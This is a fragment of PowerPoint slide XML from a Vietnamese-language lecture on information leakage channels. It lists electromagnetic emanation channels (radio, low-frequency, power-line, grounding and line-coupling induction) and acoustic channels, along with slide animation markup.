              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>điện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>trong</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>dây</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>dẫn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> ở </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>gần</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>nó</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>sự</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>cảm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>ứng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>xuyên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>điện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200"/>
              <a:t>). </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>K</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200"/>
              <a:t>ênh </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>điện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>từ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>có</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>thể</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> chia </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>thành</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>các</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>kênh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>kênh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>vô</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>tuyến</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>bức</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>xạ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>cao</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>tần</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>kênh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>tần</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>số</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>thấp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>kênh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>lưới</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>điện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>cảm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>ứng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>xuyên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>điện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>trên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>lưới</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>điện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>môi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>kênh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>nối</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>đất</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>xuyên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>điện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>trên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>dây</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>nối</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>đất</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>kênh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>tuyến</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>tính</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>xuyên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>điện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>giữa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>các</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>dây</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>liên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>lạc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>giữa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>hệ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>máy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>tính</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>K</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>ênh </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>âm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>thanh</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>liên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>quan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>tới</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>việc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>truyền</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>các</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>sóng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>âm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>trong</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>không</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>khí</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>hoặc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>các</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>dao</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>động</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>đàn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>hồi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>trong</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>các</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>môi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>trường</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>khác</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Chúng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>xuất</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>hiện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>khi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>các</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>thiết</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>bị</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>phản</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" err="1"/>
              <a:t>ánh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200"/>
              <a:t> thông tin </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>làm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>việc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="315377611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66275">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="56627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566275">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="12" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="566275">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566275">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="17" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="566275">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566275">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="22" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="566275">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566275">
                                            <p:txEl>
                                              <p:pRg st="5" end="5"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="27" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="566275">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566275">
                                            <p:txEl>
                                              <p:pRg st="6" end="6"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="32" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="566275">
                                            <p:txEl>
                                              <p:pRg st="6" end="6"/>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566275">
                                            <p:txEl>
                                              <p:pRg st="7" end="7"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="37" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="566275">
                                            <p:txEl>
                                              <p:pRg st="7" end="7"/>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566275">
                                            <p:txEl>
                                              <p:pRg st="8" end="8"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="42" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="56627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2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3600"/>
              <a:t>Kênh rò rỉ thông tin</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="567299" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825624"/>
            <a:ext cx="10515600" cy="4727576"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
